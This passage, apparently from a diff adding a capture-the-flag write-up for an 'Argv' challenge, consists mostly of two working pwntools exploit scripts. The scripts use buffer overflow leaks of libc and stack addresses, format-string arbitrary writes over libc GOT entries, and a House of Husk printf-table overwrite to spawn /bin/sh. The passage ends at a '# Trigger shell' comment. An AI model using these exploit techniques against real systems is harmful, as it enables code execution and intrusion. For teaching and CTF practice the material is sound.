+</span></span><span style="display:flex;"><span><span style="color:#e06c75">gets_leak</span><span style="color:#56b6c2">=</span><span style="color:#e5c07b">int</span>((<span style="color:#e06c75">u64</span>(<span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">recv</span>(<span style="color:#d19a66">0x8</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">ljust</span>(<span style="color:#d19a66">8</span>,<span style="color:#98c379">b</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\x00</span><span style="color:#98c379">&#34;</span>)))) 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">address</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">gets_leak</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sym</span>[<span style="color:#98c379">&#39;gets&#39;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">system</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">symbols</span>[<span style="color:#98c379">&#39;system&#39;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">puts</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">symbols</span>[<span style="color:#98c379">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">exit_fn</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">symbols</span>[<span style="color:#98c379">&#39;exit&#39;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">binsh</span><span style="color:#56b6c2">=</span><span style="color:#e5c07b">next</span>(<span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">search</span>(<span style="color:#98c379">b</span><span style="color:#98c379">&#39;/bin/sh</span><span style="color:#98c379">\x00</span><span style="color:#98c379">&#39;</span>))
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">environ</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sym</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">environ</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Leaked gets got address: &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">gets_leak</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Libc_addr base address at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">address</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Found system at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">system</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Found puts at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">puts</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Found exit_fn at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">exit_fn</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Found shell at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">binsh</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Found environ at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">environ</span>)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">[*] Stage 2: Leak stack addresses&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">payload</span><span style="color:#56b6c2">=</span><span style="color:#98c379">b</span><span style="color:#98c379">&#34;A&#34;</span> <span style="color:#56b6c2">*</span> (<span style="color:#d19a66">360</span>) <span style="color:#56b6c2">+</span> <span style="color:#e06c75">p64</span>(<span style="color:#e06c75">environ</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sendline</span>(<span style="color:#e06c75">payload</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">stack_leak</span><span style="color:#56b6c2">=</span><span style="color:#e5c07b">int</span>((<span style="color:#e06c75">u64</span>(<span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">recv</span>(<span style="color:#d19a66">0x8</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">ljust</span>(<span style="color:#d19a66">8</span>,<span style="color:#98c379">b</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\x00</span><span style="color:#98c379">&#34;</span>))))
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">buffer_start</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">stack_leak</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x178</span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Leaked stack address : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">stack_leak</span>)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">[*] Stage 3: Buffer Overflow to Format string&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Buffer starts at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">buffer_start</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#7f848e"># Null out the stack for better visibility on our writes</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">payload</span><span style="color:#56b6c2">=</span><span style="color:#98c379">b</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\x00</span><span style="color:#98c379">&#34;</span> <span style="color:#56b6c2">*</span> (<span style="color:#d19a66">360</span>) <span style="color:#56b6c2">+</span> <span style="color:#e06c75">p64</span>(<span style="color:#e06c75">buffer_start</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sendline</span>(<span style="color:#e06c75">payload</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">[*] Stage 4: Arbitrary write&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">libc_got</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">address</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x21a000</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">strlen_got</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">libc_got</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x98</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">strchrnul_got</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">libc_got</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x98</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">32</span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Found libc_got at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">libc_got</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Found strlen got address  at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">strlen_got</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Found strchrnul got address  at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">strchrnul_got</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">write_64</span>(<span style="color:#e06c75">strchrnul_got</span>,<span style="color:#e06c75">system</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">recv</span>() <span style="color:#7f848e"># Receive the garbage data returned</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">[*] Stage 5: Spawning shell&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sendline</span>(<span style="color:#98c379">b</span><span style="color:#98c379">&#34;/bin/sh</span><span style="color:#98c379">\x00</span><span style="color:#98c379">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">interactive</span>()
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">exit</span>()
+</span></span></code></pre></div><p><img src="/images/ImaginaryCTF_-_Argv/Pasted_20241110220811.png" alt=""></p>
+<h3 id="method-2-house-of-husk">Method 2: House of Husk</h3>
+<p>It is also possible to solve this challenge using the House of Husk Technique. We can create a fake structure and point <code>__printf_arginfo_table</code> to the start of the fake structure while overwriting <code>__printf_arginfo_table</code> with our forged pointer to a custom function/one gadget. We also need to ensure the value of <code>__printf_function_table</code> is not NULL and is set it to 1. So to trigger our exploit we just need to make a call to printf() with the format specifier that we have targeted. More information about this technique can be found <a href="https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507"
+
+
+
+
+ target="_blank"
+ 
+
+
+>here</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#7f848e">#!/usr/bin/env python</span>
+</span></span><span style="display:flex;"><span><span style="color:#7f848e"># -*- coding: utf-8 -*-</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">pwn</span> <span style="color:#c678dd">import</span> <span style="color:#56b6c2">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">filename</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;./argv&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">libc</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">ELF</span>(<span style="color:#98c379">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>,<span style="color:#e06c75">checksec</span><span style="color:#56b6c2">=</span><span style="color:#e5c07b">False</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">e</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">elf</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ELF</span>(<span style="color:#e06c75">filename</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">target</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">process</span>(<span style="color:#e06c75">filename</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">main</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">elf</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sym</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">main</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">write_64</span>(<span style="color:#e06c75">write_location</span>,<span style="color:#e06c75">write_value</span>):
+</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">payload</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">fmtstr_payload</span>(<span style="color:#d19a66">8</span>,{ <span style="color:#7f848e"># injection == 8</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">write_location</span>:<span style="color:#e06c75">write_value</span>
+</span></span><span style="display:flex;"><span>	})
+</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sendline</span>(<span style="color:#e06c75">payload</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">[*] Stage 1: Leak libc addresses&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">payload</span><span style="color:#56b6c2">=</span><span style="color:#98c379">b</span><span style="color:#98c379">&#34;A&#34;</span> <span style="color:#56b6c2">*</span> (<span style="color:#d19a66">360</span>) <span style="color:#56b6c2">+</span> <span style="color:#e06c75">p64</span>(<span style="color:#e06c75">elf</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">got</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">gets</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sendline</span>(<span style="color:#e06c75">payload</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">gets_leak</span><span style="color:#56b6c2">=</span><span style="color:#e5c07b">int</span>((<span style="color:#e06c75">u64</span>(<span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">recv</span>(<span style="color:#d19a66">0x8</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">ljust</span>(<span style="color:#d19a66">8</span>,<span style="color:#98c379">b</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\x00</span><span style="color:#98c379">&#34;</span>)))) 
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">address</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">gets_leak</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sym</span>[<span style="color:#98c379">&#39;gets&#39;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">system</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">symbols</span>[<span style="color:#98c379">&#39;system&#39;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">puts</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">symbols</span>[<span style="color:#98c379">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">exit_fn</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">symbols</span>[<span style="color:#98c379">&#39;exit&#39;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">binsh</span><span style="color:#56b6c2">=</span><span style="color:#e5c07b">next</span>(<span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">search</span>(<span style="color:#98c379">b</span><span style="color:#98c379">&#39;/bin/sh</span><span style="color:#98c379">\x00</span><span style="color:#98c379">&#39;</span>))
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">environ</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sym</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">environ</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Leaked gets got address: &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">gets_leak</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Libc_addr base address at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">address</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Found system at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">system</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Found puts at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">puts</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Found exit_fn at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">exit_fn</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Found shell at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">binsh</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Found environ at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">environ</span>)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">[*] Stage 2: Leak stack addresses&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">payload</span><span style="color:#56b6c2">=</span><span style="color:#98c379">b</span><span style="color:#98c379">&#34;A&#34;</span> <span style="color:#56b6c2">*</span> (<span style="color:#d19a66">360</span>) <span style="color:#56b6c2">+</span> <span style="color:#e06c75">p64</span>(<span style="color:#e06c75">environ</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sendline</span>(<span style="color:#e06c75">payload</span>)
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">try</span>:
+</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">stack_leak</span><span style="color:#56b6c2">=</span><span style="color:#e5c07b">int</span>((<span style="color:#e06c75">u64</span>(<span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">recv</span>(<span style="color:#d19a66">0x8</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">ljust</span>(<span style="color:#d19a66">8</span>,<span style="color:#98c379">b</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\x00</span><span style="color:#98c379">&#34;</span>))))
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">except</span>:
+</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">stack_leak</span><span style="color:#56b6c2">=</span><span style="color:#e5c07b">int</span>((<span style="color:#e06c75">u64</span>(<span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">recv</span>(<span style="color:#d19a66">0x8</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">ljust</span>(<span style="color:#d19a66">8</span>,<span style="color:#98c379">b</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\x00</span><span style="color:#98c379">&#34;</span>))))
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">buffer_start</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">stack_leak</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x178</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Leaked stack address : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">stack_leak</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Buffer starts at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">buffer_start</span>)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">[*] Stage 3: Format string&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">arginfo_table</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">address</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x21b8b0</span><span style="color:#7f848e"># == structure containing forged pointer</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">function_table</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">address</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x21c9c8</span> <span style="color:#7f848e"># == NOT NULL</span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Found __printf_arginfo_table at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">arginfo_table</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Found __printf_function_table at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">function_table</span>)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">[*] Stage 4: Arbitrary write&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sendline</span>(<span style="color:#98c379">b</span><span style="color:#98c379">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sendline</span>(<span style="color:#98c379">b</span><span style="color:#98c379">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#7f848e"># Convert this issue into a format string vulnerability</span>
+</span></span><span style="display:flex;"><span><span style="color:#7f848e"># Null out the stack for better visibility on our writes</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">payload</span><span style="color:#56b6c2">=</span><span style="color:#98c379">b</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\x00</span><span style="color:#98c379">&#34;</span> <span style="color:#56b6c2">*</span> (<span style="color:#d19a66">360</span>) <span style="color:#56b6c2">+</span> <span style="color:#e06c75">p64</span>(<span style="color:#e06c75">buffer_start</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sendline</span>(<span style="color:#e06c75">payload</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#7f848e"># start writing on the stack</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">fake_structure</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">buffer_start</span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Create fake structure starting at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">fake_structure</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">fake_structure_pointer</span><span style="color:#56b6c2">=</span> <span style="color:#e06c75">buffer_start</span><span style="color:#56b6c2">+</span><span style="color:#d19a66">504</span> <span style="color:#7f848e"># where system will be written</span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Create fake structure pointer at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">fake_structure_pointer</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Write system to the fake structure pointer : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">fake_structure_pointer</span>)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">write_64</span>(<span style="color:#e06c75">fake_structure_pointer</span>,<span style="color:#e06c75">system</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;[*] Point __printf_arginfo_table to the start of the fake structure i.e </span><span style="color:#98c379">{</span><span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">fake_structure</span>))<span style="color:#98c379">}</span><span style="color:#98c379">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">write_64</span>(<span style="color:#e06c75">arginfo_table</span>,<span style="color:#e06c75">buffer_start</span>) <span style="color:#7f848e"># tell arginfo_table to use our fake structure, which starts at buffer_start</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;[*] Set __printf_function_table to 1 &#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">write_64</span>(<span style="color:#e06c75">function_table</span>,<span style="color:#e06c75">p64</span>(<span style="color:#d19a66">1</span>)) <span style="color:#7f848e"># ensure __printf_function_table is not NULL</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">payload</span><span style="color:#56b6c2">=</span><span style="color:#98c379">b</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\x00</span><span style="color:#98c379">&#34;</span> <span style="color:#56b6c2">*</span> (<span style="color:#d19a66">360</span>) <span style="color:#56b6c2">+</span> <span style="color:#e06c75">p64</span>(<span style="color:#e06c75">buffer_start</span>) <span style="color:#7f848e"># Convert this issue into a format string vulnerability</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sendline</span>(<span style="color:#e06c75">payload</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">recv</span>() <span style="color:#7f848e"># Receive garbage data</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#7f848e"># Trigger shell</span>
